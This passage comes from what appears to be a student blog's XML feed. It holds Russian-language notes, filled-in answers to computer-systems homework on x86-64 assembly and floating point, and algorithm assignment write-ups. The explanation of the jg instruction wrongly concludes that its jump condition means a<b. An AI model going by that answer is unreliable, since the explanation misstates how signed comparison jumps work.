俄罗斯的中国年</li><li>2009 - 中国的俄语年</li><li>2010 - 俄罗斯的汉语年 </li><li>2013 - 中俄国家旅游年</li><li>2014 - 中俄青年友好交流年</li><li>2015 - 中俄媒体交流年</li><li>2019 - 戏剧年</li><li>2020 - 中俄科技创新年</li><li>2021 - “中俄睦邻友好合作条约”签署20周年</li><li>2022 - 中俄体育交流年</li></ul><h3 id="俄语"><a href="#俄语" class="headerlink" title="俄语"></a>俄语</h3><ul><li>俄语属于印欧语系、斯拉夫语族、东斯拉夫语支, 它是联合国六大工作语言之一(汉、英、法、俄、西、阿). </li><li>俄语字母由33个字母组成, 包含10个元音、21个辅音和2个无音字母. </li><li>俄语字母有大写和小写, 分为印刷体和手写体. </li><li>全世界有近三亿人用俄语作为母语进行交流, 有六分之一的出版物用俄语出版. </li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业2</title>
      <link href="/2022/10/06/ji-suan-ji-xi-tong-gai-lun-zuo-ye-2/"/>
      <url>/2022/10/06/ji-suan-ji-xi-tong-gai-lun-zuo-ye-2/</url>
      
        <content type="html"><![CDATA[<ol><li><p>使用不超过 $3$ 条 $x86$ 指令实现如下函数: 其中 $x, y, z, w$ 分别存储于 %rdi, %rsi, %rdx, %rcx. 返回值存储于 %rax. </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">long</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">,</span> <span class="token keyword">long</span> w<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> y <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> z <span class="token operator">+</span> w<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">add:leaq (%rsi,%rdi,4), %rsileaq (%rcx,%rsi,8), %rcxleaq (%rcx,%rdx,4), %rcxret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>$X86-64$ 体系结构中的条件跳转指令 $jg$ 是用于带符号数比较还是无符号数比较的? 其产生跳转的成立条件是 ~(SF^OF) &amp; ~ZF​ 为真, 请解释为何是这一条件. </p><p><strong>答:</strong></p><p>条件跳转指令 $jg$ 是用于带符号数比较的.</p><p>考虑被比较的两个数 $a, b$, 当 $\text{~(SF^OF)&amp;~ZF}$ 为真时: </p><p>有 $\text{~(SF^OF)}$ 为真, 则 $\text{SF^OF}$为假, 从而 $\text{SF = OF = 1}$ 或 $\text{SF = OF = 0}$, </p><p>即此时 $a\le b$.</p><p>同时有 $\text{~ZF}$ 为真, 则 $\text{ZF}$为假, 从而 $\text{ZF = 0}$, </p><p>即此时 $a\ne b$.</p><p>故 $a &lt; b$ 成立.</p></li><li><p>有如下对应的 $C$ 代码与汇编代码 $(x86-64)$, 请对照着填上代码中缺失的部分(数字请用十进制表示). </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call_swap: subq $24, %rsp movl __①__, 12(%rsp) movl $91125, 8(%rsp) leaq 8(%rsp), %rsi leaq 12(%rsp), __④__ movl $0, %eax call swap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">call_swap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> zip1 <span class="token operator">=</span> <span class="token number">15213</span><span class="token punctuation">;</span> <span class="token keyword">int</span> zip2 <span class="token operator">=</span> __②__<span class="token punctuation">;</span> __③__<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① :  <u>$15213</u></p><p>② :  <u>91125</u></p><p>③ :  <u>swap(&amp;zip1, &amp;zip2)</u></p><p>④ :  <u>%rdi</u></p></li><li><p>一个 $C$ 语言的 $for$ 循环代码 (部分) 及其 $64$ 位 $Linux$ 汇编如下所示, 请对照汇编填充 $C$ 语言里的缺失部分.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">looper</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>             x <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             x <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> x<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">looper:     movl $0, %eax     movl $0, %edx     jmp .L2 .L4:     movslq %edx, %rcx     movl (%rsi,%rcx,4), %ecx     addl $1, %eax     cmpl %eax, %ecx     jle .L3     leal (%rcx,%rcx), %eax .L3:     addl $1, %edx .L2:     cmpl %edi, %edx     jl     .L4     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>对于如下代码 </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">long</span> <span class="token function">v2permute</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token number">8253</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>     <span class="token keyword">long</span> t2 <span class="token operator">=</span> array<span class="token punctuation">[</span>t1 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> y<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t3 <span class="token operator">=</span> array<span class="token punctuation">[</span>t2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> z<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t4 <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">+</span> t3<span class="token punctuation">;</span>     <span class="token keyword">long</span> t5 <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> t1<span class="token punctuation">;</span>     <span class="token keyword">long</span> ret <span class="token operator">=</span> t3 <span class="token operator">&amp;</span> t5<span class="token punctuation">;</span>     <span class="token keyword">return</span> ret<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应如下汇编指令, 请写出每条指令之后目标寄存器存储的变量/临时变量值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">v2permute:     movq %rdx, %r8    movq %rcx, %rdx     imulq $8253, %rsi, %rax     leaq (%rax,%r8,2), %rcx     movq (%rdi,%rcx,8), %rcx     salq $4, %rcx     addq %rdx, %rcx     imulq (%rdi), %rax     andq (%rdi,%rcx,8), %rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① : <u>y</u></p><p>② : <u>z</u></p><p>③ : <u>8253 * x</u></p><p>④ : <u>8253 <em> x + 2 </em> y</u></p><p>⑤ : <u>array[8253 <em> x + 2 </em> y]</u></p><p>⑥ : <u>16 <em> array[8253 </em> x + 2 * y]</u></p><p>⑦ : <u>16 <em> array[8253 </em> x + 2 * y] + z</u></p><p>⑧ : <u>array[0] <em> 8253 </em> x</u></p><p>⑨ : <u>array[16 <em> array[8253 </em> x + 2 <em> y] + z] &amp; (array[0] </em> 8253 * x)</u></p></li><li><p>请对照下面的 $C$ 语言代码与相应汇编 $(Linux X86-64)$, 给出 $M$、$N$ 的值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">copy_element:     movslq  %edi, %rdi     movslq  %esi, %rsi     leaq    (%rsi,%rsi,2), %rax     leaq    (%rsi,%rax,4), %rax     addq    %rdi, %rax     movl    mat2(,%rax,4), %edx     leaq    0(,%rdi,8), %rax     subq    %rdi, %rax     addq    %rax, %rsi     movl    %edx, mat1(,%rsi,4)     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">M</span> <span class="token expression"><span class="token number">13</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">7</span></span></span><span class="token keyword">int</span> mat1<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> mat2<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">copy_element</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span> mat1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> mat2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业1</title>
      <link href="/2022/10/03/ji-suan-ji-xi-tong-gai-lun-zuo-ye-1/"/>
      <url>/2022/10/03/ji-suan-ji-xi-tong-gai-lun-zuo-ye-1/</url>
      
        <content type="html"><![CDATA[<ol><li>在所有由五个 $1$ 和三个 $0$ 组成的 8 位二进制整数 (补码形式) 中, 最小的数是 <u><strong>10001111</strong></u>,  最大的数是 <u><strong>01111100</strong></u>.  </li><li>已知 $[X]_{补码}$＝0x0043, $[Y]_{补码}$＝0xCE50, 则 $[X+Y]_{补码}$＝ <u><strong>0xCE93</strong></u>, $[X-Y]_{补码}$＝ <u><strong>0x31F3</strong></u>.  ($X$、$Y$ 的数据位宽均为 16 位, 计算结果用 16 进制的补码表示) </li><li>假设存在一种 16 位的浮点数表示, $exp$ 位数是 7, $frac$ 位数是 8, 符号位数是 1, 其所能表示的最大的非规格化数的 $exp$ 是 <u><strong>0000000</strong></u>, $frac$ 是 <u><strong>11111111</strong></u>;  250 (十进制数) 的 $exp$ 是 <u><strong>1000110</strong></u>, $frac$ 是 <u><strong>11110100</strong></u>. (请用 0、1 位串表示答案) </li><li>假设存在一种 9 位浮点数 (符合 IEEE 浮点数标准), 符号位数是 1, $exp$ 位数是 4, $frac$ 位数是 4. 其数值被表示为 $V = (-1)^S × M × 2^E$ 形式. 请在下表中填空.<br>$Binary$: 该浮点数的 9 位二进制表示; $M$：表示为十进制数; $E$：表示为十进制整数;<br>$Value$: 被表示的具体数值, 十进制数表示.</li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">Binary</th><th style="text-align:center">M</th><th style="text-align:center">E</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">5.0</td><td style="text-align:center"><strong>010010100</strong></td><td style="text-align:center"><strong>1.25</strong></td><td style="text-align:center"><strong>2</strong></td><td style="text-align:center">5.0</td></tr><tr><td style="text-align:center">最小的大于 0 浮点数</td><td style="text-align:center"><strong>000000001</strong></td><td style="text-align:center"><strong>0.0625</strong></td><td style="text-align:center"><strong>-6</strong></td><td style="text-align:center"><strong>0.0009765625</strong></td></tr></tbody></table></div><ol><li><p>给定相同的字长 (例如 32 位) , 能表示的定点数多还是浮点数多？</p><p><strong>答:</strong> </p><ul><li>能表示的定点数个数多.</li><li>对32位浮点数而言, 如果exp位置全为1, 会产生 $\infty$ 与 $NaN$, 进而个数少于 $2^{32}$;</li><li>而对32位定点数而言, 固定小数点都能产生 $2^{32}$ 个不一样的数.</li><li>推广到其他字长, 这都是成立的.</li><li>因此给定相同的字长, 能表示的定点数个数更多.</li></ul></li><li><p>假设存在一种 16 位浮点数 (符合 IEEE 浮点数标准) , $exp$ 位数是 5,  $frac$ 位数是 10, 符号位数是 1. 某同学对该格式的一个数 $x$ 执行了 (整数的) 按位右移操作, 得到了 80.5.  若右移操作按有符号数执行 (算术右移) , 原来的数可能是 <u><strong>不存在</strong></u>, 若右移操作按无符号数执行 (逻辑右移) , 原来的数可能是 <u><strong>-0.04736328125 或 -0.047393798828125</strong></u> (列出所有情况或填入“不存在”, 数可以用小数或分数来表示, 必须精确).  </p></li><li><p>使用不超过 4 次位运算或加减运算完成整数运算 $y = x * 85$ (允许引入临时变量, 不需考虑溢出的情况) . </p><p><strong>答:</strong> </p><ul><li><strong>$tmp1 = x &lt;&lt; 2$       ( $tmp1 = x * 4$ )</strong></li><li><strong>$tmp2 = tmp1 + x$      ( $tmp2 = x * 5$ )</strong></li><li><strong>$tmp3 = tmp2 &lt;&lt; 4$    ( $tmp3 = x * 80$ )</strong></li><li><strong>$y = tmp3 + tmp2$      ( $y = x * 85$ )</strong></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Graphics</title>
      <link href="/2022/09/30/shu-ju-jie-gou-graphics/"/>
      <url>/2022/09/30/shu-ju-jie-gou-graphics/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-2-A-B-Graphics"><a href="#1-2-A-B-Graphics" class="headerlink" title="1-2 A+B Graphics"></a>1-2 A+B Graphics</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>容易想到先将横轴和纵轴的端点进行排序预处理, 进而确定 $n$ 条线段的具体端点. 通过二分查找, 对于其中每条线段使用 <code>ToLeft</code> 测试来判断其与所给出点 $P$ 和原点 $O$ 的连线段 $OP$ 是否有交点, 高效查找出临界交点, 进而确定总交点的数目.</p><p>进行<code>ToLeft</code> 测试判断两条直线是否有交点, 可以先算出 $n$ 条线段相应横纵坐标乘积并存储, 以便进行 <code>ToLeft</code> 测试时无需重复计算, 优化算法时间性能.</p><p>由于端点坐标数据范围为 $[1, 2^{31})$, 选用 $\text{long long}$ 数组来存储坐标与相应乘积; 二分查找时对于几种临界情况进行了特殊处理与返回, 主要包含全无交点与全部交点两种情况.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>对 $x$ 轴和 $y$ 轴上的点坐标进行排序主要参考了<a href="https://www.runoob.com/cprogramming/c-function-qsort.html">此文章</a>, 选择了 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数;</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>数据输入过程的时间复杂度为 $O(n)$; 数据排序过程的时间复杂度为 $O(nlogn)$.</p><p>而算法时间复杂度主要来自二分查找交点的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 13</span><span class="token comment">// cross 函数返回与线段 OP 存在交点的最上方线段标号.</span><span class="token keyword">int</span> <span class="token function">cross</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> high <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>              mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每经过一次 <code>while</code> 循环都要访问若干次 <code>toleft</code> 函数, 此函数调用的时间为常数时间, 因此 <code>cross</code> 函数的时间复杂度与二分查找相同, 为 $O(logn)$.</p><p>进而对于 $n$ 条线段信息的输入, 进行 $m$ 次查询, 算法的时间复杂度为 $O(mlogn)$.</p><p>算法空间复杂度主要来自存储横纵坐标与相应乘积的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> y<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> z<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的数目, 对于 $n$ 条线段信息的输入, 算法的空间复杂度为 $O(n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A+B Problem</title>
      <link href="/2022/09/27/shu-ju-jie-gou-a-b-problem/"/>
      <url>/2022/09/27/shu-ju-jie-gou-a-b-problem/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-1-A-B-Problem"><a href="#1-1-A-B-Problem" class="headerlink" title="1-1 A+B Problem"></a>1-1 A+B Problem</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>一开始考虑使用普通的高精度乘法处理本题:</p><blockquote><p>使用 $\text{string}$ 存储读入的长正整数 $a = \overline{a_{n - 1}a_{n - 2}\cdots a_1a_0}$, $b = \overline{b_{m - 1}b_{m - 2}\cdots b_1b_0}$, 并逐位计算乘积 $c = \overline{c_{l - 1}c_{l - 2}\cdots c_1c_0}$, 满足 $c_k = (\Sigma a_ib_{k - i} + d_k) / 10$, 其中 $d_k$ 为计算 $c_{k - 1}$ 过程产生的进位溢出, 满足 $d_k = (\Sigma a_ib_{k - 1 - i} + d_{k - 1}) \% 10$.</p></blockquote><p>美中不足的是, 这种处理方法计算次数过多, 消耗时间过长, 因此考虑采用压位高精度乘法, 即在上述算法中乘数的每位数字均存入一个 $8$ 位整数, 而非一个简单的十进制整数. 这样扩大了参与单次计算的数据位数, 进而减少了计算次数, 降低了算法耗时.</p><p>由于 $\text{int}$ 的范围为 $[- 2^{31}, 2^{31} - 1]$, 其中 $2^{31} - 1 &lt; 10^8 * 10^8$, 在进行 $8$ 位数运算时可能会产生溢出, 因此不可选用 $\text{int}$ 存储乘数;</p><p>注意到 $\text{long long}$ 的范围为 $[- 2^{63}, 2^{63} - 1]$, 其中 $2^{63} - 1 &gt; 10^8 * 10^8$, 因此这里选用 $\text{long long}$ 数组来存储乘数. 本题也就相当于模拟 $100,000,000$ 进制的乘法. 本题算法思路如下:</p><blockquote><p>使用 $\text{long long}$ 数组存储读入的长正整数 $a = \overline{a_{n’ - 1}a_{n’ - 2}\cdots a_1a_0}$, $b = \overline{b_{m’ - 1}b_{m’ - 2}\cdots b_1b_0}$, 其中 $a_i, b_j (1\le i\le n’, 1\le j\le m’)$ 均为 $8$ 位整数. 剩下的仿照上文所述的乘法计算及进位过程即可.</p></blockquote><p>代码中的 <code>mul1</code>、 <code>mul2</code> 数组相当于此处的 $a, b$, 而 <code>answer</code> 数组记录了相应 $c$ 的取值.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>使用了一个快速将 $\text{string}$ 按每八位读入数组的 $trick$, 主要参考了<a href="https://zhuanlan.zhihu.com/p/369302523">此文章</a>, 调用了 <code>&lt;stdio.h&gt;</code> 中的 <code>sscanf()</code> 函数.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自乘法运算与进位过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 48 </span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> LEN<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> real_len2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> finish <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> real_len1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> start<span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> finish<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> mul1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">*</span> mul2<span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> MAX<span class="token punctuation">)</span> <span class="token punctuation">{</span>                         answer<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> MAX<span class="token punctuation">;</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> MAX<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于一组长整数输入$m$、$n$, 算法的时间复杂度为 $O(logm\cdot logn)$;</p><p>也即若一组长整数输入的十进制位数分别为$m$、$n$, 那么算法的时间复杂度为 $O(mn)$.</p><p>算法空间复杂度主要来自读取并存储运算数的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 22</span><span class="token keyword">char</span><span class="token operator">*</span> num1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> num2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 27</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul1<span class="token punctuation">[</span>real_len1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul2<span class="token punctuation">[</span>real_len2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> answer<span class="token punctuation">[</span>MAXLEN<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的长度, 对于一组长整数输入$m$、$n$, 算法的空间复杂度为 $O(logm + logn) = O(log(mn))$;</p><p>也即若一组输入的十进制位数分别为$m$、$n$, 那么算法的空间复杂度为 $O(m + n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门学习</title>
      <link href="/2022/09/23/git-ru-men-xue-xi/"/>
      <url>/2022/09/23/git-ru-men-xue-xi/</url>
      
